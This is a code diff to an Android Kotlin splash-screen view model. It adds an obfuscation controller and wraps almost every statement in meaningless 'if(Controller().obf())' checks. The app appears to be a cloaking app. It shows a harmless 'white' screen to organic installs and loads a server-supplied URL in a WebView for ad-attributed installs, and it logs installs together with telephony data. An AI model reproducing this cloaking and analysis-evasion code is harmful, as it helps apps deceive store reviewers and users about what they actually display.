@@ -11,6 +11,7 @@ import androidx.lifecycle.viewModelScope
 import com.klo.example.data.repository.*
 import com.klo.example.domain.model.*
 import com.klo.example.domain.usecase.*
+import com.klo.example.obfuscation.Controller
 import com.klo.example.presentation.common.Utils
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -63,12 +64,12 @@ class SplashViewModel(application: Application) : AndroidViewModel(application) 
             val data = GetAppInfoUseCase(appRepository = AppDataRepository(pkg = getApplication<Application>().packageName)).execute()
             data?.let {
                 if(data.error != null) {
-                    mutableAppInfoFailureLiveData.postValue("[AppInfo] Ошибка запроса: ${data.error}")
+                    if(Controller().obf()) mutableAppInfoFailureLiveData.postValue("[AppInfo] Ошибка запроса: ${data.error}")
                 } else {
-                    mutableAppInfoSuccessLiveData.postValue(AppDataModel(appsflyer = data.appsflyer, fb_app_id = data.fb_app_id, fb_client_token = data.fb_client_token))
+                    if(Controller().obf()) mutableAppInfoSuccessLiveData.postValue(AppDataModel(appsflyer = data.appsflyer, fb_app_id = data.fb_app_id, fb_client_token = data.fb_client_token))
                 }
             } ?: run {
-                mutableAppInfoFailureLiveData.postValue("[AppInfo]: Ошибка получения данных приложения с сервера")
+                if(Controller().obf()) mutableAppInfoFailureLiveData.postValue("[AppInfo]: Ошибка получения данных приложения с сервера")
             }
         }
     }
@@ -82,9 +83,9 @@ class SplashViewModel(application: Application) : AndroidViewModel(application) 
             val result = GetFacebookUseCase(facebookRepository = FacebookDataRepository(context = getApplication(), intent = intent)).execute()
             withContext(Dispatchers.Main) {
                 result?.let {
-                    mutableFacebookSuccessLiveData.postValue(it)
+                    if(Controller().obf()) mutableFacebookSuccessLiveData.postValue(it)
                 } ?: run {
-                    mutableFacebookFailureLiveData.postValue("[Facebook]: Кампании нету")
+                    if(Controller().obf()) mutableFacebookFailureLiveData.postValue("[Facebook]: Кампании нету")
                 }
             }
         }
@@ -98,7 +99,7 @@ class SplashViewModel(application: Application) : AndroidViewModel(application) 
                         mutableReferrerSuccessLiveData.postValue(it)
                     else mutableReferrerFailureLiveData.postValue("[Referrer]: Кампания не найдена")
                 } ?: run {
-                    mutableReferrerFailureLiveData.postValue("[Referrer]: Ошибка с методами получения Referrer")
+                    if(Controller().obf()) mutableReferrerFailureLiveData.postValue("[Referrer]: Ошибка с методами получения Referrer")
                 }
             }
         }
@@ -107,7 +108,7 @@ class SplashViewModel(application: Application) : AndroidViewModel(application) 
         viewModelScope.launch(Dispatchers.IO) {
             val result = GetPushTokenUseCase(tokenRepository = PushTokenDataRepository(context = getApplication())).execute()
             withContext(Dispatchers.Main) {
-                mutablePushTokenLiveData.postValue(result)
+                if(Controller().obf()) mutablePushTokenLiveData.postValue(result)
             }
         }
     }
@@ -116,11 +117,11 @@ class SplashViewModel(application: Application) : AndroidViewModel(application) 
             val result = GetFlowUseCase(flowRepository = FlowDataRepository(jsonObject = jsonObject, flowkey = flowkey)).execute()
             withContext(Dispatchers.Main) {
                 result?.let {
-                    SendInstallLogUseCase(installLogRepository = InstallLogDataRepository(pkg = getApplication<Application>().packageName, tm = tm, join_type = "non-organic")).execute()
-                    mutableFlowSuccessLiveData.postValue(FlowModel(url = it.url, fullscreen = it.fullscreen, orientation = it.orientation))
+                    if(Controller().obf()) SendInstallLogUseCase(installLogRepository = InstallLogDataRepository(pkg = getApplication<Application>().packageName, tm = tm, join_type = "non-organic")).execute()
+                    if(Controller().obf()) mutableFlowSuccessLiveData.postValue(FlowModel(url = it.url, fullscreen = it.fullscreen, orientation = it.orientation))
                 } ?: run {
-                    SendInstallLogUseCase(installLogRepository = InstallLogDataRepository(pkg = getApplication<Application>().packageName, tm = tm, join_type = "organic"))
-                    mutableFlowFailureLiveData.postValue("[FlowKey]: Проблема с получением flowkey")
+                    if(Controller().obf()) SendInstallLogUseCase(installLogRepository = InstallLogDataRepository(pkg = getApplication<Application>().packageName, tm = tm, join_type = "organic"))
+                    if(Controller().obf()) mutableFlowFailureLiveData.postValue("[FlowKey]: Проблема с получением flowkey")
                 }
             }
         }
@@ -131,18 +132,18 @@ class SplashViewModel(application: Application) : AndroidViewModel(application) 
         viewModelScope.launch(Dispatchers.IO) {
             when (type) {
                 0-> {
-                    openWhite(tm, map, fullscreen, orientation)
+                    if(Controller().obf()) openWhite(tm, map, fullscreen, orientation)
                 }
                 1-> {
-                    openURL(tm, map, url, fullscreen, orientation)
+                    if(Controller().obf()) openURL(tm, map, url, fullscreen, orientation)
                 }
                 2-> {
                     val result = GetOrganicUseCase(organicRepository = OrganicDataRepository(pkg = getApplication<Application>().packageName, tm = tm)).execute()
                     withContext(Dispatchers.Main) {
                         if(result != null) {
-                            openURL(tm, map, result, fullscreen, orientation)
+                            if(Controller().obf()) openURL(tm, map, result, fullscreen, orientation)
                         } else {
-                            openWhite(tm, map, fullscreen, orientation)
+                            if(Controller().obf()) openWhite(tm, map, fullscreen, orientation)
                         }
                     }
                 }
@@ -152,26 +153,26 @@ class SplashViewModel(application: Application) : AndroidViewModel(application) 
     private fun openWhite(tm: TelephonyManager, map: HashMap<String, String>, fullscreen: Int, orientation: Int) {
         CoroutineScope(Dispatchers.IO).launch {
             if (Utils().isInternetEnabled(context = getApplication(), tag = "nope"))
-                SendInstallLogUseCase(installLogRepository = InstallLogDataRepository(pkg = getApplication<Application>().packageName, tm = tm, join_type = "organic")).execute()
+                if(Controller().obf()) SendInstallLogUseCase(installLogRepository = InstallLogDataRepository(pkg = getApplication<Application>().packageName, tm = tm, join_type = "organic")).execute()
             withContext(Dispatchers.Main) {
-                map["type_join"] = "organic"
-                map["url"] = ""
-                map["fullscreen"] = fullscreen.toString()
-                map["orientation"] = orientation.toString()
-                mutableWebViewLiveData.value = map
+                if(Controller().obf()) map["type_join"] = "organic"
+                if(Controller().obf()) map["url"] = ""
+                if(Controller().obf()) map["fullscreen"] = fullscreen.toString()
+                if(Controller().obf()) map["orientation"] = orientation.toString()
+                if(Controller().obf()) mutableWebViewLiveData.value = map
             }
         }
     }
     private fun openURL(tm: TelephonyManager, map: HashMap<String, String>, url: String, fullscreen: Int, orientation: Int) {
         CoroutineScope(Dispatchers.IO).launch {
             if (Utils().isInternetEnabled(context = getApplication(), tag = "nope"))
-                SendInstallLogUseCase(installLogRepository = InstallLogDataRepository(pkg = getApplication<Application>().packageName, tm = tm, join_type = "non-organic")).execute()
+                if(Controller().obf()) SendInstallLogUseCase(installLogRepository = InstallLogDataRepository(pkg = getApplication<Application>().packageName, tm = tm, join_type = "non-organic")).execute()
             withContext(Dispatchers.Main) {
-                map["type_join"] = "non-organic"
-                map["url"] = url
-                map["fullscreen"] = fullscreen.toString()
-                map["orientation"] = orientation.toString()
-                mutableWebViewLiveData.value = map
+                if(Controller().obf()) map["type_join"] = "non-organic"
+                if(Controller().obf()) map["url"] = url
+                if(Controller().obf()) map["fullscreen"] = fullscreen.toString()
+                if(Controller().obf()) map["orientation"] = orientation.toString()
+                if(Controller().obf()) mutableWebViewLiveData.value = map
             }
         }
 
